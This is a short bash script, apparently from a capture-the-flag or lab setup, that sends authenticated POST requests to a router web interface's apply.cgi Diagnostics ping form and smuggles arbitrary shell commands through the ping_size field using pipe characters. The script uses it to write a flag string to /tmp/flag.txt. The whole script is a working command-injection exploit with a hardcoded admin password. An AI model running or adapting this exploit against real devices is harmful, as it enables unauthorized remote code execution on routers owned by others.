#!/bin/bash

auth='admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT'

run() {
	cmd="$(jq -nr '$cmd | @uri' --arg cmd "$1")"
	curl -s -k --user "$auth" -X POST -d "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=|$cmd|&ping_times=5&traceroute_ip=" http://172.21.0.15:8080/apply.cgi > /dev/null
}

run "echo \"d2WeT7D4W5B5tXbiBWecMtEvN\"|dd of=/tmp/flag.txt"